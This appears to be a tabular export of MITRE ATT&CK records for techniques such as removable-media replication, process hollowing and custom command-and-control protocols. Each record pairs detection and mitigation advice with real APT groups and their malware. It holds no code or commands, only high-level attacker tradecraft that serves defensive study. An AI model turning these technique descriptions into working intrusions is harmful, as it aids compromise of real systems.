392,"['Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for [[Command and Control]] and system and network information [[Discovery]].']",[],[],[],"['File monitoring', 'Data loss prevention']",['[[Software/S0136|USBStealer]] drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.[[CiteRef::ESET Sednit USBStealer 2014]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if it is not required for business operations.[[CiteRef::TechNet Removable Media Control]]\n\nIdentify potentially malicious software that may be used to infect removable media or may result from tainted removable media, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],"['Removable media allowed, Autorun enabled or vulnerability present that allows for code execution']","Software: USBStealer, USB Stealer, Win32/USBStealer",['Lateral Movement'],['Technique/T1091'],['Replication Through Removable Media'],https://attack.mitre.org/wiki/Technique/T1091
393,"['Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for [[Command and Control]] and system and network information [[Discovery]].']",[],[],[],"['File monitoring', 'Data loss prevention']",['[[Group/G0007|APT28]] uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.[[CiteRef::Microsoft SIR Vol 19]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if it is not required for business operations.[[CiteRef::TechNet Removable Media Control]]\n\nIdentify potentially malicious software that may be used to infect removable media or may result from tainted removable media, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],"['Removable media allowed, Autorun enabled or vulnerability present that allows for code execution']",[],['Lateral Movement'],['Technique/T1091'],['Replication Through Removable Media'],https://attack.mitre.org/wiki/Technique/T1091
394,"['Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for [[Command and Control]] and system and network information [[Discovery]].']",[],[],[],"['File monitoring', 'Data loss prevention']",['[[Group/G0013|APT30]] may have used the [[Software/S0028|SHIPSHAPE]] malware to move onto air-gapped networks. [[Software/S0028|SHIPSHAPE]] targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],"['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if it is not required for business operations.[[CiteRef::TechNet Removable Media Control]]\n\nIdentify potentially malicious software that may be used to infect removable media or may result from tainted removable media, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],"['Removable media allowed, Autorun enabled or vulnerability present that allows for code execution']",Software: SHIPSHAPE,['Lateral Movement'],['Technique/T1091'],['Replication Through Removable Media'],https://attack.mitre.org/wiki/Technique/T1091
395,"['Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for [[Command and Control]] and system and network information [[Discovery]].']",[],[],[],"['File monitoring', 'Data loss prevention']","[""[[Group/G0012|Darkhotel]]'s selective infector modifies executables stored on removable media as a method of spreading across computers.[[CiteRef::Kaspersky Darkhotel]]""]",['Darkhotel'],['Darkhotel'],['G0012'],"['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if it is not required for business operations.[[CiteRef::TechNet Removable Media Control]]\n\nIdentify potentially malicious software that may be used to infect removable media or may result from tainted removable media, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],"['Removable media allowed, Autorun enabled or vulnerability present that allows for code execution']",[],['Lateral Movement'],['Technique/T1091'],['Replication Through Removable Media'],https://attack.mitre.org/wiki/Technique/T1091
396,"['Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for [[Command and Control]] and system and network information [[Discovery]].']",[],[],[],"['File monitoring', 'Data loss prevention']",['[[Software/S0062|DustySky]] searches for removable media and duplicates itself onto it.[[CiteRef::DustySky]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if it is not required for business operations.[[CiteRef::TechNet Removable Media Control]]\n\nIdentify potentially malicious software that may be used to infect removable media or may result from tainted removable media, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],"['Removable media allowed, Autorun enabled or vulnerability present that allows for code execution']","Software: DustySky, NeD Worm",['Lateral Movement'],['Technique/T1091'],['Replication Through Removable Media'],https://attack.mitre.org/wiki/Technique/T1091
397,['Monitor file access on removable media. Detect processes that execute when removable media is mounted.'],[],[],[],"['File monitoring', 'Data loss prevention']","[""Part of [[Group/G0007|APT28]]'s operation involved using [[Software/S0023|CHOPSTICK]] modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic.[[CiteRef::FireEye APT28]][[CiteRef::ESET Sednit Part 2]][[CiteRef::Microsoft SIR Vol 19]]""]",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if they are not required for business operations.[[CiteRef::TechNet Removable Media Control]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CHOPSTICK, SPLM, ...",['Command and Control'],['Technique/T1092'],['Communication Through Removable Media'],https://attack.mitre.org/wiki/Technique/T1092
398,['Monitor file access on removable media. Detect processes that execute when removable media is mounted.'],[],[],[],"['File monitoring', 'Data loss prevention']","['[[Software/S0136|USBStealer]] drops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim.[[CiteRef::ESET Sednit USBStealer 2014]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if they are not required for business operations.[[CiteRef::TechNet Removable Media Control]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: USBStealer, USB Stealer, Win32/USBStealer",['Command and Control'],['Technique/T1092'],['Communication Through Removable Media'],https://attack.mitre.org/wiki/Technique/T1092
399,['Monitor file access on removable media. Detect processes that execute when removable media is mounted.'],[],[],[],"['File monitoring', 'Data loss prevention']",['[[Group/G0007|APT28]] uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.[[CiteRef::Microsoft SIR Vol 19]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if they are not required for business operations.[[CiteRef::TechNet Removable Media Control]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1092'],['Communication Through Removable Media'],https://attack.mitre.org/wiki/Technique/T1092
400,"['Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior.\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.']","['Process whitelisting', 'Anti-virus', 'Whitelisting by file name or path', 'Signature-based detection']",[],[],"['Process monitoring', 'API monitoring']",['[[Software/S0128|BADNEWS]] has a command to download an .exe and use process hollowing to inject it into a new process.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior. \n\nAlthough process hollowing may be used to evade certain types of defenses, it is still good practice to identify potentially malicious software that may be used to perform adversarial actions, including process hollowing, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],Software: BADNEWS,"['Defense Evasion', 'Execution']",['Technique/T1093'],['Process Hollowing'],https://attack.mitre.org/wiki/Technique/T1093
401,"['Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior.\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.']","['Process whitelisting', 'Anti-virus', 'Whitelisting by file name or path', 'Signature-based detection']",[],[],"['Process monitoring', 'API monitoring']",['A [[Group/G0040|Patchwork]] payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.[[CiteRef::Cymmetria Patchwork]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior. \n\nAlthough process hollowing may be used to evade certain types of defenses, it is still good practice to identify potentially malicious software that may be used to perform adversarial actions, including process hollowing, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],"['Defense Evasion', 'Execution']",['Technique/T1093'],['Process Hollowing'],https://attack.mitre.org/wiki/Technique/T1093
402,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0148|RTM]] uses HTTP POST requests with data formatted using a custom protocol.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: RTM,['Command and Control'],['Technique/T1094'],['Custom Command and Control Protocol'],https://attack.mitre.org/wiki/Technique/T1094
403,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","['[[Software/S0154|Cobalt Strike]] allows adversaries to modify the way the ""beacon"" payload communicates.  This is called ""Malleable C2"" in the [[Software/S0154|Cobalt Strike]] manual and is intended to allow a penetration test team to mimic known APT C2 methods.[[CiteRef::cobaltstrike manual]][[CiteRef::GitHub Malleable C2]]']",['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Cobalt Strike,['Command and Control'],['Technique/T1094'],['Custom Command and Control Protocol'],https://attack.mitre.org/wiki/Technique/T1094
404,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","[""[[Group/G0050|APT32]] uses [[Software/S0154|Cobalt Strike]]'s malleable C2 functionality to blend in with network traffic.[[CiteRef::FireEye APT32 May 2017]][[CiteRef::GitHub Malleable C2]]""]",['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1094'],['Custom Command and Control Protocol'],https://attack.mitre.org/wiki/Technique/T1094
405,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","['[[Group/G0032|Lazarus Group]] malware uses a unique form of communication encryption that mimics TLS but uses a different encryption method, evading SSL man-in-the-middle decryption attacks.[[CiteRef::Novetta Blockbuster]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1094'],['Custom Command and Control Protocol'],https://attack.mitre.org/wiki/Technique/T1094
406,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0153|RedLeaves]] can communicate to its C2 over TCP using a custom binary protocol.[[CiteRef::FireEye APT10 April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: RedLeaves, BUGJUICE",['Command and Control'],['Technique/T1094'],['Custom Command and Control Protocol'],https://attack.mitre.org/wiki/Technique/T1094
407,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],['[[Software/S0021|Derusbi]] binds to a raw socket on a random source port between 31800 and 31900 for C2.[[CiteRef::Fidelis Turbo]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Derusbi,['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
408,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],"['[[Software/S0125|Remsec]] is capable of using ICMP, TCP, and UDP for C2.[[CiteRef::Symantec Remsec IOCs]][[CiteRef::Kaspersky ProjectSauron Full Report]]']",['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
409,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],['[[Software/S0021|Derusbi]] binds to a raw socket on a random source port between 31800 and 31900 for C2.[[CiteRef::Fidelis Turbo]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Derusbi,['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
410,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],['[[Software/S0013|PlugX]] can be configured to use raw TCP or UDP for command and control.[[CiteRef::Dell TG-3390]]'],['DragonOK'],['DragonOK'],['G0017'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
411,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],"['If [[Software/S0034|NETEAGLE]] does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number, [[Software/S0034|NETEAGLE]] will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.[[CiteRef::FireEye APT30]]']",['APT30'],['APT30'],['G0013'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: NETEAGLE,['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
412,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],['[[Software/S0043|BUBBLEWRAP]] can communicate using SOCKS.[[CiteRef::FireEye admin@338]]'],['admin@338'],['admin@338'],['G0018'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: BUBBLEWRAP, 